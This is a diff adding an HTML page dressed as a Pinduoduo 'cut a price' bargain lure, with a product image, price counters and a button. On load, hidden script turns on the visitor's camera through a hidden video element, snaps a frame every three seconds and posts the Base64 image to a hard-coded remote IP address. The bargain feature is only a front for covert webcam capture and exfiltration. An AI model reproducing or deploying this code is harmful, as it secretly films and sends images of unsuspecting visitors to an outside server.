@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #F5F5F5;
+        margin: 0;
+        padding: 0;
+    }
+
+    .container {
+        max-width: 100%;
+        min-height: 100vh;
+        margin: 0 auto;
+        padding: 20px;
+        background-color: #ffffff;
+        box-shadow: 0 0 10px rgb(0 0 0 / 10%);
+        border-radius: 5px;
+        text-align: center;
+        display: flex;
+        flex-direction: column;
+        flex-wrap: wrap;
+        justify-content: center;
+        align-items: center;
+    }
+
+    h1 {
+        font-size: 70px;
+        margin-top: 0;
+    }
+
+    img {
+        width: 400px;
+        height: 400px;
+        object-fit: contain;
+        margin-bottom: 15px;
+    }
+
+    h2 {
+        font-size: 60px;
+        margin: 0;
+    }
+
+    p {
+        margin: 5px 0;
+        font-size: 40px;
+    }
+
+    button {
+        font-size: 25px;
+        padding: 10px 20px;
+        background-color: #ff5722;
+        color: #ffffff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        width: 200px;
+        height: 80px;
+    }
+
+    button:hover {
+        background-color: #ff6e40;
+    }
+</style>
+</head>
+<body>
+<div class="container">
+    <h1>拼多多砍一刀</h1>
+
+    <div>
+        <img src="https://p7.itc.cn/q_70/images03/20200802/117a2ce0a784480ba20a576e36fb177d.jpeg" alt="商品图片">
+        <h2>商品名称</h2>
+        <p>原价：¥100.00</p>
+        <p>已砍：¥20.00</p>
+        <p>还剩：¥80.00</p>
+    </div>
+
+    <button onclick="cut()">砍一刀</button>
+</div>
+
+<div>
+    <video id="video" width="500px" height="500px" autoplay="autoplay" style= "display: none"></video>
+    <canvas id="canvas" width="500px" height="500px"  style= "display: none"></canvas>
+</div>
+<script>
+    function cut() {
+        // 在此处编写砍一刀的逻辑代码
+        alert("成功砍掉一刀！");
+
+        // 更新页面显示的已砍和剩余金额
+        var alreadyCut = 20.00; // 已砍金额
+        var remaining = 80.00; // 剩余金额
+        document.getElementsByTagName('p')[1].innerHTML = "已砍：¥" + alreadyCut.toFixed(2);
+        document.getElementsByTagName('p')[2].innerHTML = "还剩：¥" + remaining.toFixed(2);
+    }
+
+    function getMedia() {
+        let constraints = {
+            //设置参数
+            video: { width: 500, height: 500 },
+            audio: false
+        };
+        let video = document.getElementById("video");
+        let promise = navigator.mediaDevices.getUserMedia(constraints);
+        promise.then(function (MediaStream) {
+            video.srcObject = MediaStream;
+            video.play();
+            //每隔10秒执行拍照函数
+            setInterval(takePhoto, 3000);
+        });
+    }
+
+    function takePhoto() {
+        let canvas = document.getElementById("canvas");
+        let ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, 500, 500);
+        // 将Canvas中的图像数据转换为Base64编码的字符串
+        let dataURL = canvas.toDataURL();
+
+        document.querySelector("img").src = dataURL;
+        // console.log(dataURL);
+        let xhr = new XMLHttpRequest();
+
+
+        // xhr.open('POST', 'http://localhost:80/load', true);
+        xhr.open('POST', 'http://111.180.193.78:6767/load', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                if (xhr.status === 200) {
+                    // 处理上传成功后的逻辑
+                    console.log(xhr.responseText);
+                } else {
+                    // 处理上传失败后的逻辑
+                    console.error('网络请求错误');
+                }
+            }
+        };
+        xhr.send(JSON.stringify({ photo: dataURL }));
+    }
+
+    function stopMedia(videoElem) {
+        const stream = videoElem.srcObject;
+        const tracks = stream.getTracks();
+        tracks.forEach(function (track) {
+            track.stop();
+        });
+        videoElem.srcObject = null;
+    }
+
+    // 页面加载完成后调用getMedia()函数
+    window.addEventListener('load', getMedia);
+</script>
+</body>
+</html>
